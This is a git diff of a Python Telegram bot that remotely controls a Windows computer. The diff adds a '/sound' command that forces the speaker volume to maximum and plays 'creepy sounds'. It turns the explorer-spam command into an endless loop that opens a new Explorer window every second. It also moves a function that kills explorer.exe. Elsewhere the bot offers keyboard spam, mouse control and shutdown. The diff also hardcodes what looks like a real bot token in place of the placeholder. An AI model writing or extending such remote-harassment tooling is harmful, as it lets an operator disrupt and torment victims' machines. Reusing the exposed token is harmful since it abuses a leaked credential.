@@ -15,8 +15,11 @@ import sys
 import pyautogui
 import time, threading
 import keyboard as kb
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
+import pygame
 
-bot_token = 'your bot token from -> @BotFather'
+bot_token = '7615104148:AAFk0NVPm-tpooR-83rY7tpFHr0K58VpIHk'
 bot = telebot.TeleBot(bot_token)
 
 devices = {}
@@ -65,6 +68,7 @@ def send_welcome(message):
         "/keyboard word/letter - writes any letter/word 1 time\n"
         "/keyboard_spam word/letter - spams an infinitely specified letter/word\n"
         "/keyboard_spam_stop - stops keyboard spam\n"
+        "/sound - makes creepy sounds\n"
     )
 
 @bot.message_handler(commands=['mouse'])
@@ -81,6 +85,40 @@ def move_mousik(message):
         for device_id in devices.keys():
             pyautogui.moveTo(x, y)
         bot.send_message(message.chat.id, f"mouse executed to all")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
+
+def set_volume():
+    try:
+        CoInitialize()
+
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        volume = interface.QueryInterface(IAudioEndpointVolume)
+
+        volume.SetMasterVolumeLevelScalar(1.0, None)
+
+    finally:
+        CoUninitialize()
+
+@bot.message_handler(commands=['sound'])
+def play_sound(message):
+    try:
+        args = message.text.split(' ')
+        if len(args) < 1:
+            bot.send_message(message.chat.id, "Usage: /mouse")
+            return
+
+        for device_id in devices.keys():
+            set_volume()
+            pygame.init()
+            song = pygame.mixer.Sound('ass.mp3')
+            song.play()
+            
+            time.sleep(song.get_length())
+            
+            pygame.quit()
+            bot.send_message(message.chat.id, "Sound played successfully.")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -313,6 +351,23 @@ def shutdown_device(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
+spam_thread = None
+spam_running = False
+
+def open_explorer():
+    global spam_running
+    spam_running = True
+    while spam_running:
+        subprocess.Popen(['explorer'])
+        time.sleep(1)
+
+def kill_explorer():
+    global spam_running
+    spam_running = False
+    for proc in psutil.process_iter(['name']):
+        if proc.info['name'] == 'explorer.exe':
+            proc.kill()
+
 @bot.message_handler(commands=['explorer_spam'])
 def explorer_spam(message):
     try:
@@ -322,8 +377,7 @@ def explorer_spam(message):
             return
 
         for device_id in devices.keys():
-            for _ in range(50):
-                subprocess.Popen('explorer')
+            threading.Thread(target=open_explorer, daemon=True).start()
             bot.send_message(message.chat.id, f"Explorer spam executed on {devices[device_id]}.")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
@@ -335,11 +389,6 @@ def stop_explorer_spam(message):
         if len(args) < 1:
             bot.send_message(message.chat.id, "Usage: /stop_explorer_spam")
             return
-
-        def kill_explorer():
-            for proc in psutil.process_iter(['name']):
-                if proc.info['name'] == 'explorer.exe':
-                    proc.kill()
 
         for device_id in devices.keys():
             kill_explorer()
